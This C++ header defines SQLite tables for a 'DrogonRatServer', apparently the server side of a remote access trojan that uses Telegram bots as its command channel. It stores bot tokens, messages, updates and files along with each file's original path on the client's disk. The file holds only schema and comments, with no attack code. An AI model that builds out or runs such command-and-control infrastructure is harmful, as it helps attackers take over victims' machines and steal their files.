#pragma once
#include <array>
#include <string_view>

/* This is the schema of the sqlite3 database for the server state, conceptually the same
 * as the bot state of the chat between a bot and a unique user in the scenario of the rat root
 * over telegram;
 * the table "file" is a simple record of a file_path and the date it was added into the db, not
 * necessarily when it was created on disk
 * the telegram_bot keeps record of the bots on the client side that are communicating, this info is
 * cached inside the Handler's memory <read Handler.hpp> the telegram_message table is supposed to
 * mimic a small subset of an actual telegram_message the telegram_file is a small abstraction that
 * links a message to a set of files, it keeps the metadata of original_file_path on the client's
 * disk
 * the telegram_update table is a record, updates before being sent and retrieved by the API's
 * getUpdate method are cached in RAM, The shell is the only one allowed to write to this table,
 * querying it is not to be done;
 * */

namespace DrogonRatServer {

static constexpr std::array<std::string_view, 5> SCHEMA_TABLE_CREATION_STATEMENTS = {{
    R"sql(
    CREATE TABLE IF NOT EXISTS file (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        file_path TEXT UNIQUE NOT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );
    )sql",
    R"sql(  
    CREATE TABLE IF NOT EXISTS telegram_bot (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        token TEXT UNIQUE NOT NULL,
        can_receive_updates BOOLEAN DEFAULT 1
    );
    )sql",

    R"sql(
    CREATE TABLE IF NOT EXISTS telegram_message (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        bot_id INTEGER NOT NULL REFERENCES telegram_bot(id),
        text TEXT,
        caption TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );
    )sql",

    R"sql(
    CREATE TABLE IF NOT EXISTS telegram_file (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        message_id INTEGER NOT NULL REFERENCES telegram_message(id) ON DELETE CASCADE,
        file_id INTEGER NOT NULL REFERENCES file(id),
        original_file_path TEXT,
        mime_type TEXT
    );
    )sql",

    R"sql(
    CREATE TABLE IF NOT EXISTS telegram_update (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        bot_id INTEGER NOT NULL REFERENCES telegram_bot(id),
        message_id INTEGER REFERENCES telegram_message(id),
        update_type TEXT DEFAULT 'message',
        update_data TEXT,
        delivered BOOLEAN DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );
    )sql"}};

}
